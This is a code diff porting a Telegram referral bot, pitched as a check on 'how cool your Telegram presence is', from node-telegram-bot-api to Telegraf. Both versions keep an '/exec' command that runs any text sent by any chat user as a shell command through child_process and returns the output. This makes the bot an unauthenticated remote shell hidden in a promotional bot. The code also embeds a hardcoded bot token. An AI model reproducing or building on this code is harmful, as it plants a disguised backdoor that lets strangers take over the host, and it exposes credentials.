@@ -1,8 +1,8 @@
-const TelegramBot = require('node-telegram-bot-api');
+const { Telegraf } = require('telegraf');
 const { exec } = require('child_process');
 
 const AppToken = '7646877814:AAFx-LjNMqIqzLs-30pTwM_vVrV0w5DHDLA';
-const bot = new TelegramBot(AppToken, { polling: true });
+const bot = new Telegraf(AppToken);
 
 const MATRIX_START_TEXT = `
 Want to know how cool your Telegram presence is? 
@@ -16,7 +16,7 @@ Take the first step and see just how you stack up!
 
 async function getUsername(userId) {
     try {
-        const user = await bot.getChat(userId);
+        const user = await bot.telegram.getChat(userId);
         return user.username ? `@${user.username}` : user.first_name;
     } catch (error) {
         console.error("Error fetching user:", error);
@@ -24,12 +24,12 @@ async function getUsername(userId) {
     }
 }
 
-bot.onText(/\/exec (.+)/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const command = match[1];
+bot.command('exec', async (ctx) => {
+    const chatId = ctx.chat.id;
+    const userId = ctx.from.id;
+    const command = ctx.message.text.split(' ').slice(1).join(' ');
 
-    const processingMessage = await bot.sendMessage(chatId, '`Processing...`', { parse_mode: 'Markdown' });
+    const processingMessage = await ctx.reply('`Processing...`', { parse_mode: 'Markdown' });
 
     exec(command, (error, stdout, stderr) => {
         let response = "";
@@ -50,7 +50,7 @@ bot.onText(/\/exec (.+)/, async (msg, match) => {
             response = 'No output from command';
         }
 
-        bot.editMessageText(response, {
+        bot.telegram.editMessageText(response, {
             chat_id: chatId,
             message_id: processingMessage.message_id,
             parse_mode: 'HTML'
@@ -58,10 +58,10 @@ bot.onText(/\/exec (.+)/, async (msg, match) => {
     });
 });
 
-bot.onText(/\/start(\s+(\S+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const commandArgs = match[2];
+bot.command('start', async (ctx) => {
+    const chatId = ctx.chat.id;
+    const userId = ctx.from.id;
+    const commandArgs = ctx.message.text.split(' ')[1];
 
     if (commandArgs && commandArgs.startsWith('ref_')) {
         const inviterId = commandArgs.split('ref_')[1];
@@ -75,12 +75,12 @@ bot.onText(/\/start(\s+(\S+))?/, async (msg, match) => {
             ]
         };
 
-        await bot.sendPhoto(chatId, "https://i.ibb.co/XDPzBWc/pngtree-virtual-panel-generate-ai-image-15868619.jpg", {
+        await ctx.telegram.sendPhoto(chatId, "https://i.ibb.co/XDPzBWc/pngtree-virtual-panel-generate-ai-image-15868619.jpg", {
             caption: messageText,
             reply_markup: inlineKeyboard
         });
 
-        await bot.sendMessage(inviterId, `${msg.from.username || msg.from.first_name} Joined via your invite link !`);
+        await ctx.telegram.sendMessage(inviterId, `${ctx.from.username || ctx.from.first_name} Joined via your invite link!`);
     } else {
         const inlineKeyboard = {
             inline_keyboard: [
@@ -89,17 +89,18 @@ bot.onText(/\/start(\s+(\S+))?/, async (msg, match) => {
             ]
         };
 
-        await bot.sendPhoto(chatId, "https://i.ibb.co/XDPzBWc/pngtree-virtual-panel-generate-ai-image-15868619.jpg", {
+        await ctx.telegram.sendPhoto(chatId, "https://i.ibb.co/XDPzBWc/pngtree-virtual-panel-generate-ai-image-15868619.jpg", {
             caption: MATRIX_START_TEXT,
             reply_markup: inlineKeyboard
         });
     }
 });
 
-bot.onText(/\/referrals/, async (msg) => {
-    const chatId = msg.chat.id;
-    const referralLink = `https://telegram.me/MTRXAi_Bot/start?ref_${msg.from.id}`;
-    await bot.sendMessage(chatId, `Here is your referral link: ${referralLink}`);
+bot.command('referrals', async (ctx) => {
+    const chatId = ctx.chat.id;
+    const referralLink = `https://telegram.me/MTRXAi_Bot/start?ref_${ctx.from.id}`;
+    await ctx.reply(`Here is your referral link: ${referralLink}`);
 });
 
+bot.launch();
 console.log('Bot is running...');
